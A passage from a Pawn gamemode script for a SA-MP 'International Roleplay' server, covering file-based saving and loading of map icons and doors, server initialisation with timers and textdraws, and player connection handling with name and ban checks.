		DoorInfo[idx][dOA]);
	    if(idx == 0)
	    {
	        file = fopen("doors.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("doors.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Doors saved successfully.");
}

enum mapiconInfo
{
	mpID,
	mpType,
	Float:mpX,
	Float:mpY,
	Float:mpZ
}
new MapIconInfo[MAX_MAPICONS][mapiconInfo];

stock SaveMapIcons()
{
	new idx = 0, File:file;
	new string[256];
	while(idx < MAX_MAPICONS)
	{
	    format(string, sizeof(string), "%d|%f|%f|%f\r\n",
		MapIconInfo[idx][mpType],
		MapIconInfo[idx][mpX],
		MapIconInfo[idx][mpY],
		MapIconInfo[idx][mpZ]);
	    if(idx == 0)
	    {
	        file = fopen("mapicons.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("mapicons.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Mapicons saved successfully.");
}

stock LoadMapIcons()
{
	new dinfo[4][128];
	new string[256];
	new File:file = fopen("mapicons.cfg", io_read);
	if(file)
	{
	    new idx = 0;
		while(idx < MAX_MAPICONS)
		{
		    fread(file, string);
		    split(string, dinfo, '|');
		    MapIconInfo[idx][mpType] = strval(dinfo[0]);
			MapIconInfo[idx][mpX] = floatstr(dinfo[1]);
			MapIconInfo[idx][mpY] = floatstr(dinfo[2]);
			MapIconInfo[idx][mpZ] = floatstr(dinfo[3]);
			if(MapIconInfo[idx][mpType]) // If mapicon exists
			{
			    MapIconInfo[idx][mpID] = CreateDynamicMapIcon(MapIconInfo[idx][mpX], MapIconInfo[idx][mpY], MapIconInfo[idx][mpZ], MapIconInfo[idx][mpType], 0 ,0);
			}
			idx++;
	    }
	}
	print("Doors loaded successfully.");
	return 1;
}

/*enum eZone
{
	Float:zMinX,
	Float:zMinY,
	Float:zMaxX,
	Float:zMaxY,
	zOwner
}
/new ZoneInfo[][eZone] = {
	{1913.677734, -1967.172119, 2177.677734, -1631.172119}
};*/
//new ZoneID[sizeof(ZoneInfo)];
main()
{
	print("\n----------------------------------");
	print(" International Roleplay  -  By Zamora");
	print("----------------------------------\n");
}


stock CheckFiles()
{
	if(!dini_Exists("arrest.cfg")) dini_Create("arrest.cfg");
	if(!dini_Exists("ban.cfg")) dini_Create("ban.cfg");
	if(!dini_Exists("business.cfg")) dini_Create("business.cfg");
	if(!dini_Exists("updates.cfg")) dini_Create("updates.cfg");
	if(!dini_Exists("bug.cfg")) dini_Create("bug.cfg");
	if(!dini_Exists("cellphones.cfg")) dini_Create("cellphones.cfg");
	if(!dini_Exists("doors.cfg")) dini_Create("doors.cfg");
	if(!dini_Exists("gates.cfg")) dini_Create("gates.cfg");
	if(!dini_Exists("drugs.cfg")) dini_Create("drugs.cfg");
	if(!dini_Exists("families.cfg")) dini_Create("families.cfg");
	if(!dini_Exists("houses.cfg")) dini_Create("houses.cfg");
	if(!dini_Exists("garages.cfg")) dini_Create("garages.cfg");
	if(!dini_Exists("mapicons.cfg")) dini_Create("mapicons.cfg");
	if(!dini_Exists("motds.cfg")) dini_Create("motds.cfg");
	if(!dini_Exists("TUpdates.cfg")) dini_Create("TUpdates.cfg");
	if(!dini_Exists("products.cfg")) dini_Create("products.cfg");
	if(!dini_Exists("vehicles.cfg")) dini_Create("vehicles.cfg");
	if(!dini_Exists("crobjects.cfg")) dini_Create("crobjects.cfg");
	if(!dini_Exists("points.cfg")) dini_Create("points.cfg");
	return 1;
}

public OnGameModeInit()
{
	CheckFiles();
	SetGameModeText(SERVER_GM_TEXT);
	SendRconCommand("hostname International Roleplay");
	SendRconCommand("www.gtairp.com");
	SendRconCommand("mapname San Andreas");
	SendRconCommand("Language English");
	AddPlayerClass(0, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
	EnableStuntBonusForAll(0);
	ConnectNPC("Seed Pickup Fix", "train_ls");
	// Timers
	SetTimer("Clock", 1000, true);
	SetTimer("OneSecondPublic", 1000, true);
	SetTimer("OneMinutePublic", 60000, true);
	SetTimer("ADTimer", 1000, true);
	SetTimer("NOPSetPlayerPos", 1000, true);
	SetTimer("SaveServer", 3600000, true);
	SetTimer("AltTabTimer", 1000, true);
	SetTimer("WeaponCheat", 1000, true);
	SetTimer("FuelTimer", 1000, true);
	SetTimer("JailTimer", 1000, true);
	SetTimer("PrisonTimer", 1000, true);
	SetTimer("FamedPoints", 60000, true);
	SetTimer("AutoMSG", 600000, true);
	SetTimer("DynamicWeather", 7200000, true);
	SetTimer("RandomDay", 14400000, false);
	SetTimer ("CheckValidTextDraws", 1000, 1);
	DisableInteriorEnterExits();
	ShowPlayerMarkers(1);
	ResetElevatorQueue();
	//UsePlayerPedAnims();
	Elevator_Initialize();
	LoadStaticVehicles();
	LoadObjects();
	LoadFactions();
	LoadFamilies();
	LoadObj();
	LoadBusiness();
	LoadHouses();
	LoadDoors();
	LoadGates();
	LoadPoints();
	LoadGarages();
	LoadMapIcons();
	LoadDrugs();
	LoadProducts();
	LoadPickups();
	LoadMOTDS();
	LoadTUpdates();
	skinlist = LoadModelSelectionMenu("skins.txt");
	toys = LoadModelSelectionMenu("toys.txt");
	// Animations
	txtAnimHelper = TextDrawCreate(571.428955, 416.426666, "~b~~k~~PED_SPRINT~ ~w~to stop the animation");
	TextDrawLetterSize(txtAnimHelper, 0.318951, 1.070932);
	TextDrawAlignment(txtAnimHelper, 1);
	TextDrawColor(txtAnimHelper, -1);
	TextDrawSetShadow(txtAnimHelper, 0);
	TextDrawSetOutline(txtAnimHelper, 1);
	TextDrawBackgroundColor(txtAnimHelper, 51);
	TextDrawFont(txtAnimHelper, 2);
	TextDrawSetProportional(txtAnimHelper, 1);
 // Time
	TimeTD = TextDrawCreate(630.000000,428.000000,"Time");
	TextDrawFont(TimeTD,3);
	TextDrawSetShadow(TimeTD,0);
	TextDrawSetOutline(TimeTD,1);
	TextDrawAlignment(TimeTD,3);
	TextDrawLetterSize(TimeTD,0.399999,1.500000);
	TextDrawColor(TimeTD,COLOR_INT);
	// Hospital
	HospitalText = TextDrawCreate(280.000000, 404.000000, "Hospital");
	TextDrawBackgroundColor(HospitalText, 255);
	TextDrawFont(HospitalText, 1);
	TextDrawLetterSize(HospitalText, 0.380000, 0.899999);
	TextDrawColor(HospitalText, -1);
	TextDrawSetOutline(HospitalText, 0);
	TextDrawSetProportional(HospitalText, 1);
	TextDrawSetShadow(HospitalText, 1);
	TextDrawSetSelectable(HospitalText, 0);
	//MainMenu
	MainMenuTxtdraw[0] = TextDrawCreate(315.000000, 26.000000, "International Roleplay");
	TextDrawAlignment(MainMenuTxtdraw[0], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[0], 255);
	TextDrawFont(MainMenuTxtdraw[0], 2);
	TextDrawLetterSize(MainMenuTxtdraw[0], 0.949999, 3.199999);
	TextDrawColor(MainMenuTxtdraw[0], -1);
	TextDrawSetOutline(MainMenuTxtdraw[0], 1);
	TextDrawSetProportional(MainMenuTxtdraw[0], 1);

	MainMenuTxtdraw[1] = TextDrawCreate(639.000000, -1.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[1], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[1], 255);
	TextDrawFont(MainMenuTxtdraw[1], 1);
	TextDrawLetterSize(MainMenuTxtdraw[1], 0.239999, 10.900000);
	TextDrawColor(MainMenuTxtdraw[1], 255);
	TextDrawSetOutline(MainMenuTxtdraw[1], 0);
	TextDrawSetProportional(MainMenuTxtdraw[1], 1);
	TextDrawSetShadow(MainMenuTxtdraw[1], 1);
	TextDrawUseBox(MainMenuTxtdraw[1], 1);
	TextDrawBoxColor(MainMenuTxtdraw[1], 255);
	TextDrawTextSize(MainMenuTxtdraw[1], 102.000000, 330.000000);

	MainMenuTxtdraw[2] = TextDrawCreate(679.000000, 100.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[2], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[2], 255);
	TextDrawFont(MainMenuTxtdraw[2], 1);
	TextDrawLetterSize(MainMenuTxtdraw[2], 0.340000, 0.100001);
	TextDrawColor(MainMenuTxtdraw[2], 255);
	TextDrawSetOutline(MainMenuTxtdraw[2], 0);
	TextDrawSetProportional(MainMenuTxtdraw[2], 1);
	TextDrawSetShadow(MainMenuTxtdraw[2], 1);
	TextDrawUseBox(MainMenuTxtdraw[2], 1);
	TextDrawBoxColor(MainMenuTxtdraw[2], 255);
	TextDrawTextSize(MainMenuTxtdraw[2], 102.000000, 349.000000);

	MainMenuTxtdraw[3] = TextDrawCreate(639.000000, 339.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[3], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[4], 255);
	TextDrawFont(MainMenuTxtdraw[3], 1);
	TextDrawLetterSize(MainMenuTxtdraw[3], 0.239999, 11.900000);
	TextDrawColor(MainMenuTxtdraw[3], 255);
	TextDrawSetOutline(MainMenuTxtdraw[3], 0);
	TextDrawSetProportional(MainMenuTxtdraw[3], 1);
	TextDrawSetShadow(MainMenuTxtdraw[3], 1);
	TextDrawUseBox(MainMenuTxtdraw[3], 1);
	TextDrawBoxColor(MainMenuTxtdraw[3], 255);
	TextDrawTextSize(MainMenuTxtdraw[3], 102.000000, 330.000000);

	MainMenuTxtdraw[4] = TextDrawCreate(679.000000, 338.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[4], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[5], 255);
	TextDrawFont(MainMenuTxtdraw[4], 1);
	TextDrawLetterSize(MainMenuTxtdraw[5], 0.340000, 0.100001);
	TextDrawColor(MainMenuTxtdraw[4], 255);
	TextDrawSetOutline(MainMenuTxtdraw[4], 0);
	TextDrawSetProportional(MainMenuTxtdraw[5], 1);
	TextDrawSetShadow(MainMenuTxtdraw[4], 1);
	TextDrawUseBox(MainMenuTxtdraw[4], 1);
	TextDrawBoxColor(MainMenuTxtdraw[4], 255);
	TextDrawTextSize(MainMenuTxtdraw[4], 102.000000, 349.000000);

	TS3Draw = TextDrawCreate(167.555725, 57.244468, "Comming Soon");
	TextDrawLetterSize(TS3Draw, 0.449999, 1.600000);
	TextDrawAlignment(TS3Draw, 1);
	TextDrawColor(TS3Draw, -1);
	TextDrawSetShadow(TS3Draw, 0);
	TextDrawSetOutline(TS3Draw, 0);
	TextDrawBackgroundColor(TS3Draw, 51);
	TextDrawFont(TS3Draw, 2);
	TextDrawSetProportional(TS3Draw, 1);

    ForumDraw = TextDrawCreate(186.666656, 75.164421, "www.gtairp.com");
	TextDrawLetterSize(ForumDraw, 0.449999, 1.600000);
	TextDrawAlignment(ForumDraw, 1);
	TextDrawColor(ForumDraw, -1);
	TextDrawSetShadow(ForumDraw, 0);
	TextDrawSetOutline(ForumDraw, 1);
	TextDrawBackgroundColor(ForumDraw, 51);
	TextDrawFont(ForumDraw, 2);
	TextDrawSetProportional(ForumDraw, 1);

    MOTDraw = TextDrawCreate(254.222167, 344.959960, "Message of the day:");
	TextDrawLetterSize(MOTDraw, 0.178444, 1.072355);
	//TextDrawTextSize(MOTDraw, 55.111133, -14.933371);
	TextDrawAlignment(MOTDraw, 1);
	TextDrawColor(MOTDraw, -1);
	TextDrawSetShadow(MOTDraw, 0);
	TextDrawSetOutline(MOTDraw, 1);
	TextDrawBackgroundColor(MOTDraw, 51);
	TextDrawFont(MOTDraw, 2);
	TextDrawSetProportional(MOTDraw, 1);

    MOTDDraw = TextDrawCreate(234.666595, 359.395507, "'");
	TextDrawLetterSize(MOTDDraw, 0.148666, 1.505422);
	TextDrawAlignment(MOTDDraw, 1);
	TextDrawColor(MOTDDraw, -1);
	TextDrawSetShadow(MOTDDraw, 0);
	TextDrawSetOutline(MOTDDraw, 1);
	TextDrawBackgroundColor(MOTDDraw, 51);
	TextDrawFont(MOTDDraw, 1);
	TextDrawSetProportional(MOTDDraw, 1);

	SPDNDraw = TextDrawCreate(9.777780, 343.964416, "International-RP Special Day");
	TextDrawLetterSize(SPDNDraw, 0.226888, 1.585066);
	TextDrawAlignment(SPDNDraw, 1);
	TextDrawColor(SPDNDraw, -2147450625);
	TextDrawSetShadow(SPDNDraw, 0);
	TextDrawSetOutline(SPDNDraw, 1);
	TextDrawBackgroundColor(SPDNDraw, 51);
	TextDrawFont(SPDNDraw, 2);
	TextDrawSetProportional(SPDNDraw, 1);

    SPDNDDraw = TextDrawCreate(10.222220, 359.395568, "'");
    TextDrawLetterSize(SPDNDDraw, 0.148666, 1.505422);
	//TextDrawLetterSize(SPDNDDraw, 0.266889, 1.415822);
	//TextDrawTextSize(SPDNDDraw, -156.888885, 0.995555);
	TextDrawAlignment(SPDNDDraw, 1);
	TextDrawColor(SPDNDDraw, -1);
	TextDrawSetShadow(SPDNDDraw, 0);
	TextDrawSetOutline(SPDNDDraw, 1);
	TextDrawBackgroundColor(SPDNDDraw, 51);
	TextDrawFont(SPDNDDraw, 2);
	TextDrawSetProportional(SPDNDDraw, 1);

	UpdatesTD = TextDrawCreate(472.889251, 340.479888, "Server Updates:");
	TextDrawLetterSize(UpdatesTD, 0.266889, 1.415822);
	TextDrawAlignment(UpdatesTD, 1);
	TextDrawColor(UpdatesTD, -1);
	TextDrawSetShadow(UpdatesTD, 0);
	TextDrawSetOutline(UpdatesTD, 1);
	TextDrawBackgroundColor(UpdatesTD, 51);
	TextDrawFont(UpdatesTD, 2);
	TextDrawSetProportional(UpdatesTD, 1);

	UpdatesTD1 = TextDrawCreate(455.110900, 357.404510, "'");
	//TextDrawLetterSize(UpdatesTD1, 0.260222, 1.196799);
	TextDrawLetterSize(UpdatesTD1, 0.148666, 1.505422);
	TextDrawAlignment(UpdatesTD1, 1);
	TextDrawColor(UpdatesTD1, -1);
	TextDrawSetShadow(UpdatesTD1, 0);
	TextDrawSetOutline(UpdatesTD1, 1);
	TextDrawBackgroundColor(UpdatesTD1, 51);
	TextDrawFont(UpdatesTD1, 1);
	TextDrawSetProportional(UpdatesTD1, 1);

	RadarHud = TextDrawCreate (495.0, 200.0, "~w~Model: ~b~~r~Speed: kmph");
    TextDrawFont (RadarHud, 2);
    TextDrawLetterSize (RadarHud, 0.3, 1.0);
    TextDrawSetShadow(RadarHud, 0);
	TextDrawSetOutline(RadarHud, 1);
	TextDrawBackgroundColor(RadarHud, 51);
	TextDrawFont(RadarHud, 2);
	TextDrawSetProportional(RadarHud, 1);

    for(new i = 0; i <= MAX_VEHICLES; i++)
    {
         Fuel[i] = 100;
	     SetVehicleToRespawn(i);
         VehRadarID [i] = -1;
         CheckingSpeed [i] = 0;
         SpeedAndModel [i] = TextDrawCreate (545.0, 200.0, "~w~ ~n~~w~");
         TextDrawFont (SpeedAndModel [i], 2);
         TextDrawLetterSize(SpeedAndModel [i], 0.3, 1.0);
         TextDrawSetShadow(SpeedAndModel [i], 0);
       	 TextDrawSetOutline(SpeedAndModel [i], 1);
       	 TextDrawBackgroundColor(SpeedAndModel [i], 51);
       	 TextDrawFont(SpeedAndModel [i], 2);
      	 TextDrawSetProportional(SpeedAndModel [i], 1);
    }
/*	new newsstring[128];
	format(newsstring, sizeof(newsstring), "News: %s", GlobalMOTD);
	MainMenuTxtdraw[6] = TextDrawCreate(322.000000, 355.000000, newsstring);
	TextDrawAlignment(MainMenuTxtdraw[6], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[6], 255);
	TextDrawFont(MainMenuTxtdraw[6], 1);
	TextDrawLetterSize(MainMenuTxtdraw[6], 0.500000, 2.499999);
	TextDrawColor(MainMenuTxtdraw[6], -1);
	TextDrawSetOutline(MainMenuTxtdraw[6], 0);
	TextDrawSetProportional(MainMenuTxtdraw[6], 1);
	TextDrawSetShadow(MainMenuTxtdraw[6], 1);*/

/*	MainMenuTxtdraw[10] = TextDrawCreate(317.000000, 414.000000, "Teamspeak:");
	TextDrawBackgroundColor(MainMenuTxtdraw[10], 255);
	TextDrawFont(MainMenuTxtdraw[10], 1);
	TextDrawLetterSize(MainMenuTxtdraw[10], 0.469999, 2.199999);
	TextDrawColor(MainMenuTxtdraw[10], -5963521);
	TextDrawSetOutline(MainMenuTxtdraw[10], 0);
	TextDrawSetProportional(MainMenuTxtdraw[10], 1);
	TextDrawSetShadow(MainMenuTxtdraw[10], 1);

	new ip[100];
	format(ip, sizeof ip, "205.234.203.108:9994");
	MainMenuTxtdraw[11] = TextDrawCreate(406.000000, 414.000000, ip);
	TextDrawBackgroundColor(MainMenuTxtdraw[11], 255);
	TextDrawFont(MainMenuTxtdraw[11], 1);
	TextDrawLetterSize(MainMenuTxtdraw[11], 0.469999, 2.199999);
	TextDrawColor(MainMenuTxtdraw[11], -1);
	TextDrawSetOutline(MainMenuTxtdraw[11], 0);
	TextDrawSetProportional(MainMenuTxtdraw[11], 1);
	TextDrawSetShadow(MainMenuTxtdraw[11], 1);*/

	Paycheck0 = TextDrawCreate(458.000000, 140.000000, "Paycheck");
	TextDrawBackgroundColor(Paycheck0, 255);
	TextDrawFont(Paycheck0, 0);
	TextDrawLetterSize(Paycheck0, 0.669999, 2.000000);
	TextDrawColor(Paycheck0, -10270721);
	TextDrawSetOutline(Paycheck0, 0);
	TextDrawSetProportional(Paycheck0, 1);
	TextDrawSetShadow(Paycheck0, 1);
	TextDrawSetSelectable(Paycheck0, 0);

	Paycheck1 = TextDrawCreate(391.000000, 170.000000, "Minutes Played: 60 | Level: 1 | Respect 19");
	TextDrawBackgroundColor(Paycheck1, 255);
	TextDrawFont(Paycheck1, 1);
	TextDrawLetterSize(Paycheck1, 0.300000, 1.000000);
	TextDrawColor(Paycheck1, -1);
	TextDrawSetOutline(Paycheck1, 0);
	TextDrawSetProportional(Paycheck1, 1);
	TextDrawSetShadow(Paycheck1, 1);
	TextDrawSetSelectable(Paycheck1, 0);

	Paycheck2 = TextDrawCreate(382.000000, 180.000000, "Paycheck: $50000 | Tax Amount $1000 (20 percent) | Total Paycheck: $49000");
	TextDrawBackgroundColor(Paycheck2, 255);
	TextDrawFont(Paycheck2, 1);
	TextDrawLetterSize(Paycheck2, 0.180000, 1.500000);
	TextDrawColor(Paycheck2, -1);
	TextDrawSetOutline(Paycheck2, 0);
	TextDrawSetProportional(Paycheck2, 1);
	TextDrawSetShadow(Paycheck2, 1);
	TextDrawSetSelectable(Paycheck2, 0);

	Paycheck3 = TextDrawCreate(390.000000, 197.000000, "Old Balance: $6803 | New Balance: $50000");
	TextDrawBackgroundColor(Paycheck3, 255);
	TextDrawFont(Paycheck3, 1);
	TextDrawLetterSize(Paycheck3, 0.300000, 1.000000);
	TextDrawColor(Paycheck3, -1);
	TextDrawSetOutline(Paycheck3, 0);
	TextDrawSetProportional(Paycheck3, 1);
	TextDrawSetShadow(Paycheck3, 1);
	TextDrawSetSelectable(Paycheck3, 0);
	//WEAPON HOLSTER
	for(new i=0;i<MAX_PLAYERS;i++)
 	if(IsPlayerConnected(i))
	RemovePlayerAttachedObject(i, 0);
	return 1;
}

public OnGameModeExit()
{
	foreach(Player, i)
    {
       	SaveChar(i);
       	ClearChar(i);
    }
	SaveFactions();
	SaveFamilies();
	SaveBusiness();
	SaveObj();
	SaveHouses();
	SavePoints();
	SaveDoors();
	SaveGates();
	SaveMapIcons();
	SaveDrugs();
	SaveProducts();
	SaveMOTDS();
	SaveTUpdates();
	SaveGarages();
	Elevator_Destroy();
	return 1;
}


public OnPlayerConnect(playerid)
{
	new string[128];
    format(string,sizeof(string), "http://translate.google.com/translate_tts?q=%s has connected to the server", GetName(playerid));
    foreach(Player, i)
    {
        if(JoinMessages[i])
        {
        	PlayAudioStreamForPlayer(i, string);
        }
    }
	ResetPlayerWeapons(playerid);
	ResetZamoraWeapons(playerid);
	// New Cityhall
    RemoveBuildingForPlayer(playerid, 1502, 341.1328, 168.7969, 1018.9766, 0.25);
    RemoveBuildingForPlayer(playerid, 2002, 358.1406, 166.8438, 1024.7813, 0.25);
    RemoveBuildingForPlayer(playerid, 1999, 354.6328, 170.9375, 1024.7734, 0.25);
    RemoveBuildingForPlayer(playerid, 1806, 354.2578, 171.7500, 1024.7734, 0.25);
    RemoveBuildingForPlayer(playerid, 1806, 355.8438, 171.7500, 1024.7734, 0.25);
    RemoveBuildingForPlayer(playerid, 2009, 356.6719, 171.9375, 1024.7734, 0.25);
    RemoveBuildingForPlayer(playerid, 2001, 358.2109, 175.2344, 1024.7813, 0.25);
    RemoveBuildingForPlayer(playerid, 1714, 359.0547, 173.5859, 1007.3828, 0.25);
    RemoveBuildingForPlayer(playerid, 2190, 360.1016, 171.8203, 1008.1016, 0.25);
    RemoveBuildingForPlayer(playerid, 2190, 360.3125, 174.9609, 1008.1016, 0.25);
    RemoveBuildingForPlayer(playerid, 2001, 364.6016, 170.6484, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 2001, 364.6641, 176.9766, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 2001, 373.3438, 169.6016, 1018.9766, 0.25);
    RemoveBuildingForPlayer(playerid, 2001, 374.0078, 170.6406, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 1703, 371.8516, 171.2500, 1018.9766, 0.25);
    RemoveBuildingForPlayer(playerid, 1817, 370.4063, 173.0547, 1018.9766, 0.25);
    RemoveBuildingForPlayer(playerid, 1703, 373.3125, 174.6953, 1018.9766, 0.25);
    RemoveBuildingForPlayer(playerid, 2001, 373.9766, 176.9453, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 2002, 369.7813, 178.4141, 1018.9766, 0.25);
    RemoveBuildingForPlayer(playerid, 1502, 370.7891, 179.1875, 1013.1719, 0.25);
    RemoveBuildingForPlayer(playerid, 1776, 371.5938, 178.4531, 1020.0703, 0.25);
    RemoveBuildingForPlayer(playerid, 1703, 373.6641, 182.5703, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 1703, 371.6563, 183.8438, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 1817, 373.0234, 184.2500, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 1703, 372.5234, 186.0781, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 1703, 374.7734, 184.9844, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 2011, 371.0781, 188.9297, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 2002, 373.4688, 188.9375, 1007.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 1776, 374.8906, 188.9766, 1008.4766, 0.25);
    RemoveBuildingForPlayer(playerid, 1502, 365.7969, 196.2734, 1007.3750, 0.25);

	// Mat Depot
	RemoveBuildingForPlayer(playerid, 13483, 2113.5781, -96.7344, 0.9844, 0.25);
    RemoveBuildingForPlayer(playerid, 12990, 2113.5781, -96.7344, 0.9844, 0.25);
    RemoveBuildingForPlayer(playerid, 1369, 2104.0156, -105.2656, 1.7031, 0.25);
    RemoveBuildingForPlayer(playerid, 933, 2159.4063, -93.9219, 1.8047, 0.25);
    RemoveBuildingForPlayer(playerid, 933, 2158.1094, -94.1406, 2.2969, 0.25);
    RemoveBuildingForPlayer(playerid, 933, 2155.9141, -121.0391, 0.0859, 0.25);
	// Sprunk
	RemoveBuildingForPlayer(playerid, 1302, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 1209, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 955, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 956, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 1775, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 1776, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 1977, 0.0, 0.0, 0.0, 6000.0);
    //remove gym crack dens
    RemoveBuildingForPlayer(playerid, 3662, 2141.8672, -1693.3516, 17.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 3662, 2154.3516, -1713.6641, 17.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 1501, 2138.3438, -1697.1094, 14.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 3661, 2141.8672, -1693.3516, 17.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 3661, 2154.3516, -1713.6641, 17.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 1501, 2150.8281, -1717.4297, 14.0703, 0.25);
	//gym
	RemoveBuildingForPlayer(playerid, 1307, 2263.5234, -1742.1953, 12.7500, 0.25);
	//big building behind gas station remove
	RemoveBuildingForPlayer(playerid, 4025, 1777.8359, -1773.9063, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 4215, 1777.5547, -1775.0391, 36.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 4019, 1777.8359, -1773.9063, 12.5234, 0.25);
	//remove biobord@ballas for the church
	RemoveBuildingForPlayer(playerid, 1266, 2289.8750, -1553.7500, 30.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 1260, 2289.8750, -1553.7422, 30.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 17916, 2366.8125, -1537.5391, 39.4688, 0.25);
	// Area 51
    RemoveBuildingForPlayer(playerid, 16094, 135, 1940, 21, 500.0);
    RemoveBuildingForPlayer(playerid, 16668, 135, 1940, 21, 500.0);
    RemoveBuildingForPlayer(playerid, 16669, 135, 1940, 21, 500.0);
    RemoveBuildingForPlayer(playerid, 16670, 135, 1940, 21, 500.0);
    RemoveBuildingForPlayer(playerid, 16671, 135, 1940, 21, 500.0);
    RemoveBuildingForPlayer(playerid, 1411, 135, 1940, 21, 500.0);
    RemoveBuildingForPlayer(playerid, 16095, 135, 1940, 21, 500.0);
    RemoveBuildingForPlayer(playerid, 16096, 135, 1940, 21, 500.0);
    if(IsPlayerNPC(playerid))
	{
		SetPlayerColor(playerid, TRANSPARENT_WHITE);
		return 1;
	}
	// MAX IPS
	/*new connecting_ip[32+1];
	GetPlayerIp(playerid,connecting_ip,32);
	new num_players_on_ip = GetNumberOfPlayersOnThisIP(connecting_ip);

	if(num_players_on_ip > MAX_CONNECTIONS_FROM_IP)
	{
		printf("MAXIPs: Connecting player(%d) exceeded %d IP connections from %s.", playerid, MAX_CONNECTIONS_FROM_IP, connecting_ip);
		// Banning
    	Player[playerid][pBanned] = 1;
    	// Banreason
    	new file[32];
    	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
    	dini_Set(file, "BanReason", "Bots Attacking");
    	dini_Set(file, "BannedBy", ""ADMIN_BOT"");
    	// BanList
    	SendClientMessage(playerid, COLOR_LIGHTRED, "You've exceeded the maximum IP connections, You can request to get unbanned from "SERVER_WEB".");
    	format(string, sizeof(string), "AdmCmd: %s has been banned by "ADMIN_BOT", reason: Bots Attacking", GetName(playerid));
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
     	AddBan(playerid);
    	Kick(playerid);
	    return 1;
	}
	// DONE*/
	Player[playerid][pFacDuty] = 0;
	ClearChar(playerid);
	ClearCar(playerid);
	gPlayerLoggin{playerid} = 1;
	// NAME CHECK
	new playername[32], pfile[64];
	format(pfile, sizeof(pfile), "Accounts/%s.ini", GetAccountName(playerid));
	if(!dini_Exists(pfile))
	{
	    GetPlayerName(playerid, playername, sizeof(playername));
	    // Has numbers
	    if(strfind(playername, "0", true) != -1 || strfind(playername, "1", true) != -1 || strfind(playername, "2", true) != -1 || strfind(playername, "3", true) != -1 || strfind(playername, "4", true) != -1 || strfind(playername, "5", true) != -1
		|| strfind(playername, "6", true) != -1 || strfind(playername, "7", true) != -1 || strfind(playername, "8", true) != -1 || strfind(playername, "9", true) != -1 || strfind(playername, "[", true) != -1 || strfind(playername, "]", true) != -1)
		{
			SendClientMessage(playerid, COLOR_DARKRED, "International Roleplay: You need to reconnect with a roleplay name format. Firstname_Lastname.");
			SendClientMessage(playerid, COLOR_DARKRED, "International Roleplay: Please remove numbers, or tags from your name.");
			Kick(playerid);
		}
	    // No Underscore
		if(strfind(playername, "_", true) == -1)
		{
			SendClientMessage(playerid, COLOR_DARKRED, "International Roleplay: You need to reconnect with a roleplay name format. Firstname_Lastname.");
			Kick(playerid);
		}
	}
	// Done
    Player[playerid][pLoggedIn] = 0;
    Player[playerid][pSpawn] = 0;
    Player[playerid][pTutorial] = 0;
    SetPlayerColor(playerid, TRANSPARENT_GREY);
    new file[64];
	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
	// Checking for IP Ban
	if(CheckIPBan(playerid) == 1 && !dini_Int(file, "Whitelisted"))
	{
	    format(string, sizeof(string), "Your range is banned by %s, You can request to get whitelisted on "SERVER_WEB".", dini_Get(file, "BannedBy"));
	    SendClientMessage(playerid, COLOR_LIGHTRED, string);
		Kick(playerid);
		return 1;
	}
	// Checking for ban
	if(CheckBan(playerid) == 1)
	{
    	format(file, sizeof(file), "Bans/%s.ini", GetAccountName(playerid));
    	format(string, sizeof(string), "You are banned from the server by %s and the reason is %s, You can request to get unbanned on "SERVER_WEB".", dini_Get(file, "BannedBy"), dini_Get(file, "BanReason"));
	    SendClientMessage(playerid, COLOR_LIGHTRED, string);
		Kick(playerid);
		return 1;
	}
	// Checking for character ban
	if(dini_Int(file, "pBanned") == 1)
	{
	    format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
    	format(string, sizeof(string), "You are banned from the server by %s and the reason is %s, You can request to get unbanned on "SERVER_WEB".", dini_Get(file, "BannedBy"), dini_Get(file, "BanReason"));
	    SendClientMessage(playerid, COLOR_LIGHTRED, string);
	    Kick(playerid);
	    return 1;
	}
	if(!Player[playerid][pHouse])
	{
	    Player[playerid][pHouse] = 0;
	}
	if(!Player[playerid][pBiz])
	{
	    Player[playerid][pBiz] = 0;
	}
